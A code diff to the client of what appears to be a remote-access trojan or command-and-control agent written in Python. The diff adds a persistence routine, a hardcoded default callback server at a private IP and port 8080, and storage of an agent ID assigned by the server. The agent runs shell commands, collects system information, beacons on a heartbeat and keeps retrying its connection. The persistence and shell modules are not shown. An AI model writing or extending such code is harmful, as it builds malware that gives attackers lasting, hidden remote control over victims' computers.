@@ -5,19 +5,28 @@ import time
 from data import get_system_info
 from shell import run_command
 from helper import send_json, receive_json
+from persistence import setup_persistence
 
 
-SERVER_HOST = sys.argv[1]
-SERVER_PORT = int(sys.argv[2])
+if len(sys.argv) < 2:
+    SERVER_HOST = "192.168.10.150"
+    SERVER_PORT = 8080
+else:
+    SERVER_HOST = sys.argv[1]
+    SERVER_PORT = int(sys.argv[2])
+
 BUFFER_SIZE = 1024
-AGENT_ID_FILENAME = "uuid.txt"
+
+EXE_LOCATION, AGENT_ID_LOCATION = setup_persistence()  # Setup persistence and return exe and agent ID locations.
+print(EXE_LOCATION)
+print(AGENT_ID_LOCATION)
 MAX_TIMEOUT = 180  # Send heartbeat interval.
 RETRY_CONNECT_INTERVAL = 60  # Retry connection interval.
 
 def read_uuid() -> str | None:
 
-    if os.path.exists(AGENT_ID_FILENAME):
-        with open(AGENT_ID_FILENAME, "r") as f:
+    if os.path.exists(AGENT_ID_LOCATION):
+        with open(AGENT_ID_LOCATION, "r") as f:
             data = f.read()
             if data:
                 return data
@@ -41,7 +50,7 @@ def communicate(s: socket.socket, initial_connection_info: dict) -> None:
         agent_uid = receive_json(s)
 
         # Save to file received agent_id
-        with open(AGENT_ID_FILENAME, "w") as f:
+        with open(AGENT_ID_LOCATION, "w") as f:
             f.write(agent_uid)
 
         while True:
